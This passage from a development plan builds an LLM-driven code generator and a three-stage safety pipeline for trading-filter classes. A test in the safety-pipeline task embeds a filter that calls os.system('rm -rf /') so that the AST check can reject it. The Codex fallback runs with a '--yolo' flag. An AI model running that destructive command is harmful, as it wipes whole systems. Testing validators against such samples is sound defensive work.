            return self._disabled_result()
        return EdgeResult(allowed=True, edge_name=self.name, reason="ok")
```

```python
# FILE: tests/test_generated_test_filter.py
class TestTestFilter:
    def test_allows_when_condition_met(self):
        pass
    def test_blocks_when_condition_violated(self):
        pass
    def test_disabled_passes_through(self):
        pass
```'''
        mock_result.returncode = 0

        hypothesis = {
            "description": "Test hypothesis",
            "evidence": {},
            "filter_spec": {
                "name": "test_filter",
                "class_name": "TestFilter",
                "category": "entry",
                "description": "Test filter",
                "params": {},
                "logic_description": "Always allow",
            },
        }

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            result = generate_edge_filter(hypothesis)
            mock_run.assert_called_once()
            call_args = mock_run.call_args
            assert call_args[0][0][0] == "claude"
            assert result.filter_code is not None

    def test_falls_back_to_codex_on_claude_failure(self):
        from src.discovery.codegen.llm_generator import generate_edge_filter

        # Claude fails
        claude_exc = FileNotFoundError("claude not found")
        # Codex succeeds
        codex_result = MagicMock()
        codex_result.stdout = '''```python
# FILE: src/edges/generated/test_filter.py
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class TestFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("test_filter", config)
    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()
        return EdgeResult(allowed=True, edge_name=self.name, reason="ok")
```

```python
# FILE: tests/test_generated_test_filter.py
class TestTestFilter:
    def test_allows(self): pass
    def test_blocks(self): pass
    def test_disabled(self): pass
```'''
        codex_result.returncode = 0

        hypothesis = {
            "description": "Test",
            "evidence": {},
            "filter_spec": {
                "name": "test_filter",
                "class_name": "TestFilter",
                "category": "entry",
                "description": "Test",
                "params": {},
                "logic_description": "Test",
            },
        }

        with patch("subprocess.run", side_effect=[claude_exc, codex_result]) as mock_run:
            result = generate_edge_filter(hypothesis)
            assert mock_run.call_count == 2
            assert result.filter_code is not None

    def test_returns_empty_on_total_failure(self):
        from src.discovery.codegen.llm_generator import generate_edge_filter

        hypothesis = {
            "description": "Test",
            "evidence": {},
            "filter_spec": {
                "name": "fail_filter",
                "class_name": "FailFilter",
                "category": "entry",
                "description": "Test",
                "params": {},
                "logic_description": "Test",
            },
        }

        with patch("subprocess.run", side_effect=FileNotFoundError("not found")):
            result = generate_edge_filter(hypothesis)
            assert result.filter_code is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_llm_generator.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement LLM generator**

```python
# src/discovery/codegen/llm_generator.py
"""LLM code generation for EdgeFilter subclasses.

Uses Claude Code CLI (claude -p) as the primary generator, with Codex CLI
(codex exec) as fallback when Claude hits rate limits or is unavailable.
Parses the LLM response to extract filter code and test code blocks.
"""

from __future__ import annotations

import logging
import re
import subprocess
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from src.discovery.codegen.template_renderer import render_codegen_prompt

logger = logging.getLogger(__name__)


@dataclass
class GeneratedCode:
    """Result of LLM code generation."""
    filter_code: Optional[str] = None
    test_code: Optional[str] = None
    filter_path: Optional[str] = None
    test_path: Optional[str] = None
    provider: str = ""  # "claude" or "codex"
    raw_response: str = ""


def parse_generated_code(response: str) -> GeneratedCode:
    """Parse LLM response to extract filter and test code blocks.

    Expects two ```python code blocks, the first containing the filter
    implementation and the second containing the test class. Identifies
    which is which via the FILE comment or content heuristics.

    Parameters
    ----------
    response:
        Raw LLM response string.

    Returns
    -------
    GeneratedCode with filter_code and test_code extracted.
    """
    if not response or not response.strip():
        return GeneratedCode(raw_response=response)

    # Extract all ```python blocks
    blocks = re.findall(
        r"```python\s*\n(.*?)\n\s*```",
        response,
        re.DOTALL,
    )

    if not blocks:
        return GeneratedCode(raw_response=response)

    result = GeneratedCode(raw_response=response)

    for block in blocks:
        block = block.strip()
        # Identify by FILE comment or content
        is_test = (
            "# FILE: tests/" in block
            or "class Test" in block
            and "def test_" in block
            and "EdgeFilter" not in block.split("class Test")[0]
        )
        is_filter = (
            "# FILE: src/edges/" in block
            or "(EdgeFilter)" in block
        )

        if is_filter and result.filter_code is None:
            result.filter_code = block
            # Extract path from FILE comment
            path_match = re.search(r"# FILE:\s*(\S+)", block)
            if path_match:
                result.filter_path = path_match.group(1)
        elif is_test and result.test_code is None:
            result.test_code = block
            path_match = re.search(r"# FILE:\s*(\S+)", block)
            if path_match:
                result.test_path = path_match.group(1)

    # If we only found one block and it has EdgeFilter, it's the filter
    if len(blocks) == 1 and result.filter_code is None and "(EdgeFilter)" in blocks[0]:
        result.filter_code = blocks[0].strip()

    return result


def _run_claude(prompt: str, timeout: int = 300) -> str:
    """Invoke Claude Code CLI and return stdout."""
    result = subprocess.run(
        ["claude", "-p"],
        input=prompt,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    return result.stdout


def _run_codex(prompt: str, timeout: int = 300) -> str:
    """Invoke Codex CLI as fallback and return stdout."""
    result = subprocess.run(
        ["codex", "exec", "--yolo", "--ephemeral"],
        input=prompt,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    return result.stdout


def generate_edge_filter(
    hypothesis: Dict[str, Any],
    timeout: int = 300,
    claude_only: bool = False,
) -> GeneratedCode:
    """Generate an EdgeFilter subclass using LLM code generation.

    Tries Claude Code CLI first. On failure (rate limit, timeout, not
    installed), falls back to Codex CLI unless claude_only=True.

    Parameters
    ----------
    hypothesis:
        Dict with keys: description, evidence, filter_spec.
    timeout:
        CLI subprocess timeout in seconds.
    claude_only:
        If True, skip Codex fallback.

    Returns
    -------
    GeneratedCode with filter_code and test_code (or None on failure).
    """
    prompt = render_codegen_prompt(hypothesis)

    # Try Claude first
    try:
        logger.info("Generating EdgeFilter via Claude Code CLI")
        response = _run_claude(prompt, timeout=timeout)
        if response.strip():
            result = parse_generated_code(response)
            result.provider = "claude"
            if result.filter_code:
                logger.info("Claude generated filter code (%d chars)", len(result.filter_code))
                return result
            logger.warning("Claude response did not contain valid code blocks")
    except FileNotFoundError:
        logger.warning("Claude CLI not found, trying Codex fallback")
    except subprocess.TimeoutExpired:
        logger.warning("Claude CLI timed out after %ds", timeout)
    except Exception as exc:
        logger.warning("Claude CLI failed: %s", exc)

    # Codex fallback
    if not claude_only:
        try:
            logger.info("Falling back to Codex CLI")
            response = _run_codex(prompt, timeout=timeout)
            if response.strip():
                result = parse_generated_code(response)
                result.provider = "codex"
                if result.filter_code:
                    logger.info("Codex generated filter code (%d chars)", len(result.filter_code))
                    return result
        except FileNotFoundError:
            logger.warning("Codex CLI not found")
        except subprocess.TimeoutExpired:
            logger.warning("Codex CLI timed out after %ds", timeout)
        except Exception as exc:
            logger.warning("Codex CLI failed: %s", exc)

    logger.error("All LLM providers failed for hypothesis: %s", hypothesis.get("id", "unknown"))
    return GeneratedCode()
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_llm_generator.py -v`
Expected: All 6 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/discovery/codegen/llm_generator.py tests/test_llm_generator.py
git commit -m "feat: add LLM code generator with Claude/Codex fallback (Task 3)"
```

---

### Task 4: Subprocess Test Executor

**Files:**
- Create: `src/discovery/codegen/test_executor.py`
- Test: `tests/test_test_executor.py`

- [ ] **Step 1: Write failing tests for test executor**

```python
# tests/test_test_executor.py
"""Tests for subprocess pytest executor for generated code."""

import tempfile
from pathlib import Path

import pytest


class TestTestExecutor:
    def test_passing_test_returns_success(self, tmp_path):
        from src.discovery.codegen.test_executor import run_generated_tests

        # Write a minimal passing test file
        test_file = tmp_path / "test_passing.py"
        test_file.write_text('''
def test_one():
    assert 1 + 1 == 2

def test_two():
    assert True

def test_three():
    assert "hello".startswith("h")
''')

        result = run_generated_tests(str(test_file))
        assert result.passed is True
        assert result.num_passed >= 3
        assert result.num_failed == 0

    def test_failing_test_returns_failure(self, tmp_path):
        from src.discovery.codegen.test_executor import run_generated_tests

        test_file = tmp_path / "test_failing.py"
        test_file.write_text('''
def test_one():
    assert 1 + 1 == 2

def test_two():
    assert False, "intentional failure"

def test_three():
    assert True
''')

        result = run_generated_tests(str(test_file))
        assert result.passed is False
        assert result.num_failed >= 1

    def test_import_error_returns_failure(self, tmp_path):
        from src.discovery.codegen.test_executor import run_generated_tests

        test_file = tmp_path / "test_import_error.py"
        test_file.write_text('''
from nonexistent_module import something

def test_one():
    assert True
''')

        result = run_generated_tests(str(test_file))
        assert result.passed is False

    def test_timeout_returns_failure(self, tmp_path):
        from src.discovery.codegen.test_executor import run_generated_tests

        test_file = tmp_path / "test_timeout.py"
        test_file.write_text('''
import time

def test_slow():
    time.sleep(60)
''')

        result = run_generated_tests(str(test_file), timeout=2)
        assert result.passed is False
        assert "timeout" in result.error.lower()

    def test_requires_minimum_test_count(self, tmp_path):
        from src.discovery.codegen.test_executor import run_generated_tests

        test_file = tmp_path / "test_few.py"
        test_file.write_text('''
def test_one():
    assert True
''')

        result = run_generated_tests(str(test_file), min_tests=3)
        assert result.passed is False
        assert "minimum" in result.error.lower() or "3" in result.error
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_test_executor.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement test executor**

```python
# src/discovery/codegen/test_executor.py
"""Subprocess pytest executor for generated EdgeFilter test code.

Runs pytest in a subprocess with a timeout to validate that generated
test classes pass. Captures stdout/stderr and parses results.
"""

from __future__ import annotations

import json
import logging
import re
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)


@dataclass
class TestResult:
    """Result of running pytest on generated tests."""
    passed: bool
    num_passed: int = 0
    num_failed: int = 0
    num_errors: int = 0
    num_collected: int = 0
    stdout: str = ""
    stderr: str = ""
    error: str = ""


def run_generated_tests(
    test_file: str,
    timeout: int = 60,
    min_tests: int = 3,
    extra_args: list[str] | None = None,
) -> TestResult:
    """Run pytest on a generated test file in a subprocess.

    Parameters
    ----------
    test_file:
        Absolute path to the test file.
    timeout:
        Subprocess timeout in seconds.
    min_tests:
        Minimum number of tests that must be collected.
    extra_args:
        Additional pytest arguments.

    Returns
    -------
    TestResult with pass/fail status and details.
    """
    test_path = Path(test_file)
    if not test_path.exists():
        return TestResult(
            passed=False,
            error=f"Test file does not exist: {test_file}",
        )

    cmd = [
        sys.executable, "-m", "pytest",
        str(test_path),
        "-v",
        "--tb=short",
        "--no-header",
        "-q",
    ]
    if extra_args:
        cmd.extend(extra_args)

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=str(Path.cwd()),
        )
    except subprocess.TimeoutExpired:
        return TestResult(
            passed=False,
            error=f"Timeout: tests did not complete within {timeout}s",
        )
    except Exception as exc:
        return TestResult(
            passed=False,
            error=f"Failed to run pytest: {exc}",
        )

    stdout = proc.stdout
    stderr = proc.stderr

    # Parse pytest output for counts
    num_passed = 0
    num_failed = 0
    num_errors = 0
    num_collected = 0

    # Match "X passed", "X failed", "X error" patterns
    passed_match = re.search(r"(\d+)\s+passed", stdout)
    failed_match = re.search(r"(\d+)\s+failed", stdout)
    error_match = re.search(r"(\d+)\s+error", stdout)

    if passed_match:
        num_passed = int(passed_match.group(1))
    if failed_match:
        num_failed = int(failed_match.group(1))
    if error_match:
        num_errors = int(error_match.group(1))

    num_collected = num_passed + num_failed + num_errors

    # Check minimum test count
    if num_collected < min_tests:
        return TestResult(
            passed=False,
            num_passed=num_passed,
            num_failed=num_failed,
            num_errors=num_errors,
            num_collected=num_collected,
            stdout=stdout,
            stderr=stderr,
            error=(
                f"Only {num_collected} tests collected, minimum {min_tests} required. "
                f"Generated tests must include at least {min_tests} test methods."
            ),
        )

    all_passed = num_failed == 0 and num_errors == 0 and proc.returncode == 0

    return TestResult(
        passed=all_passed,
        num_passed=num_passed,
        num_failed=num_failed,
        num_errors=num_errors,
        num_collected=num_collected,
        stdout=stdout,
        stderr=stderr,
        error="" if all_passed else f"{num_failed} failed, {num_errors} errors",
    )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_test_executor.py -v`
Expected: All 5 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/discovery/codegen/test_executor.py tests/test_test_executor.py
git commit -m "feat: add subprocess pytest executor for generated tests (Task 4)"
```

---

### Task 5: Mini-Backtest Validator

**Files:**
- Create: `src/discovery/codegen/backtest_validator.py`
- Test: `tests/test_backtest_validator.py`

- [ ] **Step 1: Write failing tests for backtest validator**

```python
# tests/test_backtest_validator.py
"""Tests for mini-backtest + walk-forward validation of generated filters."""

from unittest.mock import patch, MagicMock
from dataclasses import dataclass

import pytest


@dataclass
class FakeBacktestResult:
    """Minimal stand-in for BacktestResult."""
    trades: list
    metrics: dict


class TestMiniBacktestValidator:
    def test_accepts_filter_that_maintains_win_rate(self):
        from src.discovery.codegen.backtest_validator import validate_with_backtest

        baseline_result = FakeBacktestResult(
            trades=[{"r_multiple": 1.5}] * 37 + [{"r_multiple": -1.0}] * 63,
            metrics={"win_rate": 0.37, "total_trades": 100},
        )
        candidate_result = FakeBacktestResult(
            trades=[{"r_multiple": 1.5}] * 35 + [{"r_multiple": -1.0}] * 65,
            metrics={"win_rate": 0.35, "total_trades": 100},
        )

        with patch(
            "src.discovery.codegen.backtest_validator._run_mini_backtest",
            side_effect=[baseline_result, candidate_result],
        ):
            result = validate_with_backtest(
                filter_code="fake code",
                filter_name="test_filter",
                filter_class_name="TestFilter",
                category="entry",
                max_win_rate_degradation=0.05,
            )
            assert result.passed is True

    def test_rejects_filter_that_degrades_win_rate(self):
        from src.discovery.codegen.backtest_validator import validate_with_backtest

        baseline_result = FakeBacktestResult(
            trades=[{"r_multiple": 1.5}] * 37 + [{"r_multiple": -1.0}] * 63,
            metrics={"win_rate": 0.37, "total_trades": 100},
        )
        # Severe degradation: 37% -> 20%
        candidate_result = FakeBacktestResult(
            trades=[{"r_multiple": 1.5}] * 20 + [{"r_multiple": -1.0}] * 80,
            metrics={"win_rate": 0.20, "total_trades": 100},
        )

        with patch(
            "src.discovery.codegen.backtest_validator._run_mini_backtest",
            side_effect=[baseline_result, candidate_result],
        ):
            result = validate_with_backtest(
                filter_code="fake code",
                filter_name="test_filter",
                filter_class_name="TestFilter",
                category="entry",
                max_win_rate_degradation=0.05,
            )
            assert result.passed is False
            assert "win rate" in result.reason.lower() or "degradation" in result.reason.lower()

    def test_accepts_filter_that_blocks_all_when_no_degradation(self):
        from src.discovery.codegen.backtest_validator import validate_with_backtest

        baseline_result = FakeBacktestResult(
            trades=[{"r_multiple": 1.5}] * 5 + [{"r_multiple": -1.0}] * 10,
            metrics={"win_rate": 0.33, "total_trades": 15},
        )
        # Blocks most trades but remaining ones have higher win rate
        candidate_result = FakeBacktestResult(
            trades=[{"r_multiple": 1.5}] * 4 + [{"r_multiple": -1.0}] * 4,
            metrics={"win_rate": 0.50, "total_trades": 8},
        )

        with patch(
            "src.discovery.codegen.backtest_validator._run_mini_backtest",
            side_effect=[baseline_result, candidate_result],
        ):
            result = validate_with_backtest(
                filter_code="fake code",
                filter_name="test_filter",
                filter_class_name="TestFilter",
                category="entry",
                max_win_rate_degradation=0.05,
            )
            assert result.passed is True


class TestWalkForwardValidation:
    def test_requires_improvement_on_2_oos_windows(self):
        from src.discovery.codegen.backtest_validator import (
            validate_walk_forward,
            WalkForwardWindow,
        )

        windows = [
            WalkForwardWindow(
                window_id="oos_1",
                baseline_win_rate=0.37,
                candidate_win_rate=0.42,
                baseline_avg_r=-0.05,
                candidate_avg_r=0.10,
                n_trades=25,
            ),
            WalkForwardWindow(
                window_id="oos_2",
                baseline_win_rate=0.35,
                candidate_win_rate=0.40,
                baseline_avg_r=-0.03,
                candidate_avg_r=0.08,
                n_trades=30,
            ),
            WalkForwardWindow(
                window_id="oos_3",
                baseline_win_rate=0.40,
                candidate_win_rate=0.38,
                baseline_avg_r=0.02,
                candidate_avg_r=-0.01,
                n_trades=20,
            ),
        ]

        result = validate_walk_forward(windows, min_improved_windows=2)
        assert result.passed is True
        assert result.improved_count >= 2

    def test_rejects_when_fewer_than_2_windows_improve(self):
        from src.discovery.codegen.backtest_validator import (
            validate_walk_forward,
            WalkForwardWindow,
        )

        windows = [
            WalkForwardWindow(
                window_id="oos_1",
                baseline_win_rate=0.37,
                candidate_win_rate=0.42,
                baseline_avg_r=-0.05,
                candidate_avg_r=0.10,
                n_trades=25,
            ),
            WalkForwardWindow(
                window_id="oos_2",
                baseline_win_rate=0.35,
                candidate_win_rate=0.30,
                baseline_avg_r=-0.03,
                candidate_avg_r=-0.10,
                n_trades=30,
            ),
            WalkForwardWindow(
                window_id="oos_3",
                baseline_win_rate=0.40,
                candidate_win_rate=0.35,
                baseline_avg_r=0.02,
                candidate_avg_r=-0.05,
                n_trades=20,
            ),
        ]

        result = validate_walk_forward(windows, min_improved_windows=2)
        assert result.passed is False
        assert result.improved_count < 2
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_backtest_validator.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement backtest validator**

```python
# src/discovery/codegen/backtest_validator.py
"""Mini-backtest + walk-forward validation for generated EdgeFilters.

Stage 3 of the safety pipeline. Runs a short backtest (1000 bars) with
and without the candidate filter to ensure it does not degrade win rate
by more than 5%. Then runs walk-forward validation on multiple OOS
windows to confirm the edge generalizes.
"""

from __future__ import annotations

import importlib
import logging
import sys
import tempfile
import types
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


@dataclass
class BacktestValidationResult:
    """Result of mini-backtest validation."""
    passed: bool
    baseline_win_rate: float = 0.0
    candidate_win_rate: float = 0.0
    win_rate_delta: float = 0.0
    baseline_trades: int = 0
    candidate_trades: int = 0
    reason: str = ""


@dataclass
class WalkForwardWindow:
    """Metrics for a single OOS validation window."""
    window_id: str
    baseline_win_rate: float
    candidate_win_rate: float
    baseline_avg_r: float
    candidate_avg_r: float
    n_trades: int


@dataclass
class WalkForwardResult:
    """Result of walk-forward OOS validation."""
    passed: bool
    improved_count: int = 0
    total_windows: int = 0
    windows: List[WalkForwardWindow] = field(default_factory=list)
    reason: str = ""


def _run_mini_backtest(
    filter_name: Optional[str] = None,
    filter_class_name: Optional[str] = None,
    filter_code: Optional[str] = None,
    category: str = "entry",
    n_bars: int = 1000,
) -> Any:
    """Run a mini-backtest with or without the candidate filter.

    When filter_name is None, runs the baseline backtest without the
    candidate filter. When provided, dynamically loads the filter and
    adds it to the edge pipeline.

    This is a thin wrapper around IchimokuBacktester.run() that:
    1. Loads the most recent 1000 bars of cached data
    2. Optionally injects the candidate filter into EdgeManager
    3. Returns the BacktestResult

    Parameters
    ----------
    filter_name:
        Registered name for the candidate filter (None for baseline).
    filter_class_name:
        Class name of the candidate filter.
    filter_code:
        Source code of the candidate filter (loaded dynamically).
    category:
        Edge category: 'entry', 'exit', or 'modifier'.
    n_bars:
        Number of 5M bars to backtest.

    Returns
    -------
    BacktestResult from the mini-backtest.
    """
    # Lazy import to avoid circular dependency at module load time
    from src.backtesting.vectorbt_engine import BacktestEngine

    # Load cached data (most recent n_bars of 5M data)
    engine = BacktestEngine()

    if filter_code and filter_name and filter_class_name:
        # Dynamically load the generated filter
        module = types.ModuleType(f"generated_filter_{filter_name}")
        exec(compile(filter_code, f"<generated:{filter_name}>", "exec"), module.__dict__)
        filter_cls = getattr(module, filter_class_name)

        # Register temporarily in EdgeManager._REGISTRY
        from src.edges.manager import _REGISTRY
        _REGISTRY[filter_name] = (filter_cls, category)

    result = engine.run()

    # Clean up temporary registration
    if filter_name:
        from src.edges.manager import _REGISTRY
        _REGISTRY.pop(filter_name, None)

    return result


def validate_with_backtest(
    filter_code: str,
    filter_name: str,
    filter_class_name: str,
    category: str = "entry",
    max_win_rate_degradation: float = 0.05,
    n_bars: int = 1000,
) -> BacktestValidationResult:
    """Validate a generated filter via mini-backtest comparison.

    Runs two backtests:
    1. Baseline: without the candidate filter
    2. Candidate: with the candidate filter active

    The candidate passes if its win rate does not drop more than
    max_win_rate_degradation below the baseline.

    Parameters
    ----------
    filter_code:
        Complete Python source for the generated EdgeFilter.
    filter_name:
        The filter's registered name (e.g., 'high_adx_london').
    filter_class_name:
        The class name (e.g., 'HighADXLondonFilter').
    category:
        Edge category: 'entry', 'exit', or 'modifier'.
    max_win_rate_degradation:
        Maximum allowed win rate drop (0.05 = 5 percentage points).
    n_bars:
        Number of bars for the mini-backtest.

    Returns
    -------
    BacktestValidationResult with pass/fail and metrics.
    """
    # Run baseline
    try:
        baseline = _run_mini_backtest(n_bars=n_bars)
    except Exception as exc:
        return BacktestValidationResult(
            passed=False,
            reason=f"Baseline backtest failed: {exc}",
        )

    baseline_wr = baseline.metrics.get("win_rate", 0.0)
    baseline_trades = baseline.metrics.get("total_trades", len(baseline.trades))

    # Run with candidate filter
    try:
        candidate = _run_mini_backtest(
            filter_name=filter_name,
            filter_class_name=filter_class_name,
            filter_code=filter_code,
            category=category,
            n_bars=n_bars,
        )
    except Exception as exc:
        return BacktestValidationResult(
            passed=False,
            baseline_win_rate=baseline_wr,
            baseline_trades=baseline_trades,
            reason=f"Candidate backtest failed: {exc}",
        )

    candidate_wr = candidate.metrics.get("win_rate", 0.0)
    candidate_trades = candidate.metrics.get("total_trades", len(candidate.trades))
    delta = candidate_wr - baseline_wr

    degradation = baseline_wr - candidate_wr
    passed = degradation <= max_win_rate_degradation

    reason = (
        f"Win rate: {baseline_wr:.1%} -> {candidate_wr:.1%} "
        f"(delta={delta:+.1%}). "
        f"Trades: {baseline_trades} -> {candidate_trades}. "
    )
    if not passed:
        reason += (
            f"Degradation {degradation:.1%} exceeds maximum "
            f"allowed {max_win_rate_degradation:.1%}."
        )

    return BacktestValidationResult(
        passed=passed,
        baseline_win_rate=baseline_wr,
        candidate_win_rate=candidate_wr,
        win_rate_delta=delta,
        baseline_trades=baseline_trades,
        candidate_trades=candidate_trades,
        reason=reason,
    )


def validate_walk_forward(
    windows: List[WalkForwardWindow],
    min_improved_windows: int = 2,
) -> WalkForwardResult:
    """Validate that a filter improves metrics on multiple OOS windows.

    A window counts as "improved" if the candidate has BOTH:
    - Higher win rate than baseline, AND
    - Higher average R-multiple than baseline

    Parameters
    ----------
    windows:
        List of WalkForwardWindow with baseline vs candidate metrics.
    min_improved_windows:
        Minimum number of windows that must show improvement.

    Returns
    -------
    WalkForwardResult with pass/fail and breakdown.
    """
    improved_count = 0

    for w in windows:
        wr_improved = w.candidate_win_rate > w.baseline_win_rate
        r_improved = w.candidate_avg_r > w.baseline_avg_r
        if wr_improved and r_improved:
            improved_count += 1

    passed = improved_count >= min_improved_windows

    reason = (
        f"{improved_count}/{len(windows)} OOS windows improved "
        f"(need {min_improved_windows}+). "
    )
    if not passed:
        reason += "Filter does not generalize to out-of-sample data."

    return WalkForwardResult(
        passed=passed,
        improved_count=improved_count,
        total_windows=len(windows),
        windows=windows,
        reason=reason,
    )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_backtest_validator.py -v`
Expected: All 5 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/discovery/codegen/backtest_validator.py tests/test_backtest_validator.py
git commit -m "feat: add mini-backtest + walk-forward validator for generated filters (Task 5)"
```

---

### Task 6: Safety Pipeline Orchestrator

**Files:**
- Create: `src/discovery/codegen/safety_pipeline.py`
- Test: `tests/test_safety_pipeline.py`

- [ ] **Step 1: Write failing tests for safety pipeline**

```python
# tests/test_safety_pipeline.py
"""Tests for the 3-stage safety pipeline orchestrator."""

import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock
from dataclasses import dataclass

import pytest


class TestSafetyPipeline:
    def _clean_filter_code(self) -> str:
        return '''
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult


class HighADXFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("high_adx", config)
        params = config.get("params", {})
        self._threshold = float(params.get("adx_threshold", 35.0))

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()
        if context.adx >= self._threshold:
            return EdgeResult(allowed=True, edge_name=self.name, reason="ADX OK")
        return EdgeResult(allowed=False, edge_name=self.name, reason="ADX low")
'''

    def _clean_test_code(self) -> str:
        return '''
from datetime import datetime, timezone
import pytest
from src.edges.base import EdgeContext, EdgeResult


def _ctx(**kw):
    defaults = dict(
        timestamp=datetime(2024, 6, 15, 10, 0, tzinfo=timezone.utc),
        day_of_week=5, close_price=2350.0, high_price=2355.0,
        low_price=2345.0, spread=15.0, session="london",
        adx=30.0, atr=5.0,
    )
    defaults.update(kw)
    return EdgeContext(**defaults)


class TestHighADXFilter:
    def test_allows_high_adx(self):
        from src.edges.generated.high_adx import HighADXFilter
        f = HighADXFilter({"enabled": True, "params": {"adx_threshold": 25.0}})
        result = f.should_allow(_ctx(adx=30.0))
        assert result.allowed is True

    def test_blocks_low_adx(self):
        from src.edges.generated.high_adx import HighADXFilter
        f = HighADXFilter({"enabled": True, "params": {"adx_threshold": 35.0}})
        result = f.should_allow(_ctx(adx=20.0))
        assert result.allowed is False

    def test_disabled_passes(self):
        from src.edges.generated.high_adx import HighADXFilter
        f = HighADXFilter({"enabled": False, "params": {}})
        result = f.should_allow(_ctx())
        assert result.allowed is True
'''

    def test_stage1_ast_rejects_dangerous_code(self):
        from src.discovery.codegen.safety_pipeline import SafetyPipeline

        pipeline = SafetyPipeline()
        bad_code = '''
import os
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class BadFilter(EdgeFilter):
    def should_allow(self, context: EdgeContext) -> EdgeResult:
        os.system("rm -rf /")
        return EdgeResult(allowed=True, edge_name="bad", reason="bad")
'''
        result = pipeline.run(
            filter_code=bad_code,
            test_code="",
            filter_name="bad",
            filter_class_name="BadFilter",
            category="entry",
            skip_backtest=True,
        )
        assert result.passed is False
        assert result.failed_stage == "ast_validation"

    def test_stage2_pytest_rejects_failing_tests(self):
        from src.discovery.codegen.safety_pipeline import SafetyPipeline

        pipeline = SafetyPipeline()
        filter_code = self._clean_filter_code()
        bad_test_code = '''
class TestHighADXFilter:
    def test_one(self):
        assert False, "intentional failure"
    def test_two(self):
        assert True
    def test_three(self):
        assert True
'''

        result = pipeline.run(
            filter_code=filter_code,
            test_code=bad_test_code,
            filter_name="high_adx",
            filter_class_name="HighADXFilter",
            category="entry",
            skip_backtest=True,
        )
        assert result.passed is False
        assert result.failed_stage == "pytest_execution"

    def test_all_stages_pass_for_clean_code(self):
        from src.discovery.codegen.safety_pipeline import SafetyPipeline
        from src.discovery.codegen.backtest_validator import BacktestValidationResult

        pipeline = SafetyPipeline()

        # Mock backtest to avoid needing real data
        mock_bt_result = BacktestValidationResult(
            passed=True,
            baseline_win_rate=0.37,
            candidate_win_rate=0.38,
            win_rate_delta=0.01,
            baseline_trades=50,
            candidate_trades=45,
            reason="Win rate maintained",
        )

        with patch(
            "src.discovery.codegen.safety_pipeline.validate_with_backtest",
            return_value=mock_bt_result,
        ):
            result = pipeline.run(
                filter_code=self._clean_filter_code(),
                test_code=self._clean_test_code(),
                filter_name="high_adx",
                filter_class_name="HighADXFilter",
                category="entry",
            )
            # AST should pass, we mock backtest; pytest depends on actual file
            assert result.ast_passed is True

    def test_pipeline_result_contains_all_stages(self):
        from src.discovery.codegen.safety_pipeline import SafetyPipeline, PipelineResult

        pipeline = SafetyPipeline()
        result = pipeline.run(
            filter_code=self._clean_filter_code(),
            test_code=self._clean_test_code(),
            filter_name="high_adx",
            filter_class_name="HighADXFilter",
            category="entry",
            skip_backtest=True,
        )
        assert isinstance(result, PipelineResult)
        assert hasattr(result, "ast_passed")
        assert hasattr(result, "pytest_passed")
        assert hasattr(result, "backtest_passed")
        assert hasattr(result, "failed_stage")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_safety_pipeline.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement safety pipeline**

```python
# src/discovery/codegen/safety_pipeline.py
"""3-stage safety pipeline for generated EdgeFilter code.

Stage 1: AST whitelist validation — reject dangerous imports/calls.
Stage 2: pytest execution — generated tests must pass.
Stage 3: Mini-backtest validation — filter must not degrade win rate.

Each stage short-circuits: if a stage fails, subsequent stages are skipped.
"""

from __future__ import annotations

import logging
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from src.discovery.codegen.ast_validator import validate_ast, ASTValidationResult
from src.discovery.codegen.test_executor import run_generated_tests, TestResult
from src.discovery.codegen.backtest_validator import (
    validate_with_backtest,
    BacktestValidationResult,
)

logger = logging.getLogger(__name__)


@dataclass
class PipelineResult:
    """Complete result of the 3-stage safety pipeline."""
    passed: bool = False
    failed_stage: Optional[str] = None

    # Stage 1: AST validation
    ast_passed: bool = False
    ast_result: Optional[ASTValidationResult] = None

    # Stage 2: pytest execution
    pytest_passed: bool = False
    pytest_result: Optional[TestResult] = None

    # Stage 3: backtest validation
    backtest_passed: bool = False
    backtest_result: Optional[BacktestValidationResult] = None

    # Metadata
    filter_name: str = ""
    filter_class_name: str = ""
    filter_file: str = ""
    test_file: str = ""


class SafetyPipeline:
    """Orchestrate 3-stage validation for generated EdgeFilter code.

    Usage:
        pipeline = SafetyPipeline()
        result = pipeline.run(
            filter_code=generated_filter_source,
            test_code=generated_test_source,
            filter_name="high_adx_london",
            filter_class_name="HighADXLondonFilter",
            category="entry",
        )
        if result.passed:
            # Safe to register and use the filter
            ...
    """

    def __init__(
        self,
        output_dir: str = "src/edges/generated",
        test_timeout: int = 60,
        min_tests: int = 3,
        max_win_rate_degradation: float = 0.05,
        mini_backtest_bars: int = 1000,
    ) -> None:
        self._output_dir = Path(output_dir)
        self._test_timeout = test_timeout
        self._min_tests = min_tests
